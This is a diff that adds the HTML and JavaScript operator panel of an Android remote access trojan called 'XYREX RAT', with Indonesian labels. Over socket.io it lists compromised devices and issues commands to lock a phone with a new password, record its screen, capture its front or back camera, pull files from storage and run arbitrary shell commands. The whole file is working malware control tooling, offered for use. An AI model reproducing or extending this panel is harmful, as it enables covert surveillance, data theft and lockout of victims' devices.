@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>XYREX RAT Panel</title>
+<style>
+  :root{--bg:#f5f0e1;--ink:#111;--accent:#ffde00;--red:#ff4d4d;--blue:#4d79ff}
+  *{box-sizing:border-box;font-family:'Courier New',monospace}
+  body{margin:0;background:var(--bg);color:var(--ink);padding:24px}
+  h1{font-size:28px;border-bottom:3px solid var(--ink);padding-bottom:8px}
+  .grid{display:grid;grid-template-columns:320px 1fr;gap:20px}
+  .card{background:#fff;border:3px solid var(--ink);box-shadow:4px 4px 0 var(--ink);padding:16px}
+  .dev{padding:10px;border:3px solid var(--ink);margin-bottom:10px;cursor:pointer;background:#fff}
+  .dev.active{background:var(--accent)}
+  .dev .name{font-weight:bold}
+  .dev .meta{font-size:12px}
+  .on{color:#0a0}.off{color:#a00}
+  button{background:var(--ink);color:#fff;border:3px solid var(--ink);padding:8px 12px;cursor:pointer;font-weight:bold}
+  button:hover{background:var(--accent);color:var(--ink)}
+  button.danger{background:var(--red)}
+  input,select{width:100%;padding:8px;border:3px solid var(--ink);margin:4px 0 10px}
+  .row{display:flex;gap:8px}
+  .row>*{flex:1}
+  pre{background:#111;color:#0f0;padding:12px;overflow:auto;max-height:400px;border:3px solid var(--ink)}
+  img.preview{max-width:100%;border:3px solid var(--ink)}
+  video.preview{max-width:100%;border:3px solid var(--ink)}
+  .label{font-weight:bold;margin-top:10px}
+</style>
+</head>
+<body>
+<h1>XYREX RAT CONTROL</h1>
+<div class="grid">
+  <div class="card">
+    <h2>Devices</h2>
+    <div id="devices"></div>
+    <button onclick="refresh()">Refresh</button>
+  </div>
+  <div class="card">
+    <h2>Control: <span id="activeDev">-</span></h2>
+    <div class="label">Flashlight kelap-kelip</div>
+    <div class="row">
+      <input id="flashInterval" placeholder="interval ms" value="300">
+      <input id="flashDuration" placeholder="durasi ms" value="5000">
+    </div>
+    <button onclick="send('flash',{interval:+flashInterval.value,duration:+flashDuration.value})">Eksekusi Flash</button>
+
+    <div class="label">Lock Device (sandi custom)</div>
+    <input id="lockPass" placeholder="sandi baru" value="1234">
+    <button onclick="send('lock',{password:lockPass.value})">Lock + Set Sandi</button>
+
+    <div class="label">Rekam Layar</div>
+    <div class="row">
+      <input id="recDur" placeholder="durasi detik" value="15">
+    </div>
+    <button onclick="send('screen',{duration:+recDur.value})">Rekam</button>
+
+    <div class="label">Kamera</div>
+    <div class="row">
+      <button onclick="send('cam_front',{})">Depan</button>
+      <button onclick="send('cam_back',{})">Belakang</button>
+    </div>
+
+    <div class="label">Ambil File</div>
+    <input id="filePath" placeholder="/sdcard/Download/file.txt" value="/sdcard/Download/">
+    <button onclick="send('files',{path:filePath.value})">List/Ambil</button>
+
+    <div class="label">Shell</div>
+    <input id="shellCmd" placeholder="ls /sdcard">
+    <button onclick="send('shell',{cmd:shellCmd.value})">Jalankan</button>
+
+    <div class="label">Output</div>
+    <pre id="out">idle</pre>
+    <div id="media"></div>
+  </div>
+</div>
+<script src="/socket.io/socket.io.js"></script>
+<script>
+const socket = io('/rat');
+let active = null;
+let devices = [];
+
+socket.on('connect', () => { socket.emit('rat:list'); refresh(); });
+socket.on('rat:devices', (list) => { devices = list; render(); });
+socket.on('rat:result', (r) => {
+  const out = document.getElementById('out');
+  out.textContent += '\n[' + r.cmd + '] ' + (r.ok?'OK':'ERR') + ' ' + (r.text||'') + (r.file?(' file='+r.file):'');
+  out.scrollTop = out.scrollHeight;
+  if (r.file) {
+    const m = document.getElementById('media');
+    if (/\.(jpg|jpeg|png)$/i.test(r.file)) m.innerHTML = '<img class="preview" src="'+r.file+'">';
+    else if (/\.(mp4|webm)$/i.test(r.file)) m.innerHTML = '<video class="preview" controls src="'+r.file+'"></video>';
+    else m.innerHTML = '<a href="'+r.file+'" target="_blank">Download '+r.file+'</a>';
+  }
+});
+
+function refresh(){ socket.emit('rat:list'); }
+function render(){
+  const box = document.getElementById('devices');
+  box.innerHTML = devices.length ? '' : '<div class="dev">Belum ada device</div>';
+  devices.forEach(d => {
+    const el = document.createElement('div');
+    el.className = 'dev' + (active===d.id?' active':'');
+    el.innerHTML = '<div class="name">'+d.name+' ('+d.id.slice(0,8)+')</div>'
+      + '<div class="meta">'+d.model+' | Android '+d.android+' | <span class="'+(d.online?'on':'off')+'">'+(d.online?'ONLINE':'OFFLINE')+'</span></div>';
+    el.onclick = () => { active = d.id; document.getElementById('activeDev').textContent = d.name; render(); };
+    box.appendChild(el);
+  });
+}
+function send(cmd, args){
+  if (!active) { alert('pilih device dulu'); return; }
+  socket.emit('rat:cmd', { deviceId: active, cmd, args });
+  document.getElementById('out').textContent += '\n>> '+cmd+' '+JSON.stringify(args);
+}
+</script>
+</body>
+</html>
